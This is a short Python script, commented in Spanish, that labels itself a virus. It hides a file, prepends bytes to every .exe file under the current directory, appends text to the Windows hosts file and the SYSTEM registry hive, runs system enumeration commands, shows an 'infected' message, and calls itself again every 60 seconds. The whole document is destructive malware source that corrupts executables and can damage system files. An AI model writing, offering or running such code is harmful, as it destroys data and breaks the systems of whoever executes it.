import os
import sys
import shutil
import subprocess
import ctypes
import time

# Función para ocultar un archivo o directorio
def hide_file(path):
    attributes = ctypes.windll.kernel32.GetFileAttributesW(path)
    attributes |= 0x02  # 0x02 es el atributo de archivo oculto
    ctypes.windll.kernel32.SetFileAttributesW(path, attributes)

# Función para crear un archivo oculto con contenido malicioso
def create_hidden_file(path, content):
    with open(path, 'w') as file:
        file.write(content)
    hide_file(path)

# Función para infectar archivos ejecutables (.exe)
def infect_exe(file_path):
    with open(file_path, 'rb') as file:
        content = file.read()

    malicious_code = b'\x90' * 100  # Nop sled (código no operacional)
    with open(file_path, 'wb') as file:
        file.write(malicious_code + content)

# Función para buscar y infectar archivos ejecutables en un directorio
def search_and_infect_exe(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.exe'):
                file_path = os.path.join(root, file)
                infect_exe(file_path)

# Función para modificar archivos del sistema
def modify_system_files():
    system_files = [
        r'C:\Windows\System32\drivers\etc\hosts',
        r'C:\Windows\System32\config\SYSTEM'
    ]

    for file_path in system_files:
        if os.path.exists(file_path):
            with open(file_path, 'a') as file:
                file.write('\n# Infectado por el virus\n')

# Función para ejecutar comandos en el sistema
def execute_command(command):
    subprocess.run(command, shell=True)

# Función principal del virus
def main():
    # Crear un archivo oculto con contenido malicioso
    hidden_file_path = os.path.join(os.getenv('TEMP'), 'malicious_file.txt')
    create_hidden_file(hidden_file_path, 'Contenido malicioso')

    # Infectar archivos ejecutables en el directorio actual y subdirectorios
    search_and_infect_exe(os.getcwd())

    # Modificar archivos del sistema
    modify_system_files()

    # Ejecutar comandos en el sistema
    execute_command('ipconfig /all')
    execute_command('tasklist')

    # Mostrar un mensaje de infección
    ctypes.windll.user32.MessageBoxW(None, 'Tu sistema ha sido infectado!', 'Virus', 0x00000010)

    # Programar la ejecución del virus nuevamente después de 60 segundos
    time.sleep(60)
    main()

if __name__ == "__main__":
    main()